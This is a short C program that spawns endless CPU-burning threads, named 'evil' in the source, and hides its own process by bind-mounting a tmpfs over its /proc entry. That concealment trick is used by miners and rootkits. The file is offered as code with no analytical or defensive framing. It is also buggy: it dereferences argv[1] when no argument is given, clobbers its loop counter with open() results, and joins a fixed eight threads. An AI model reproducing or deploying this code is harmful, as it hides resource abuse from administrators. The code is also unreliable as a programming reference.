#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>

// Hide current process
void hide() {
    char proc[20];
    sprintf(proc, "/proc/%d", getpid());
    mount("/tmp/empty", proc, "tmpfs", MS_BIND, NULL);
}

// A Loop that consuming CPU
void *evil(void *id) {
    while (1) {
        char filename[20];
        int *v = (int *)id;
        sprintf(filename, "/tmp/random%d", *v);
        int flags;
        int i;

        for (i = 3; i < 259; i++) {
            if (i == 64 || i == 128)
                continue;
            i = open(filename, O_RDONLY);
            if (i == -1) {
                perror("open");
                return;
            }
            flags = fcntl(i, F_GETFD);
            flags &= ~FD_CLOEXEC;
            fcntl(i, F_SETFD, flags);
        }
        for (i = 3; i < 259; i++) {
            if (i != 64 && i != 128)
            {
                close(i);
            }
        }
    }
}

// Idea here is using a pthread to start some CPU consuming program, then hide the process
// by rebind /proc file system
int main(int argc, char** argv) {
    int i;
    size_t n = 4;  // Default value
    if (argc <= 1) {
        n = atoi(argv[1]);
    }
    pthread_t *thread_ids = (pthread_t *)calloc(n, sizeof(pthread_t));
    int *ids = (int *)calloc(n, sizeof(int));
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    for (i = 0; i < n; i++)
    {
        ids[i] = i + 1;
        pthread_create(&thread_ids[i], &attr, &evil, &ids[i]);
    }
    hide();
    for (i = 0; i < 8; i++)
    {
        pthread_join(thread_ids[i], NULL);
    }
}
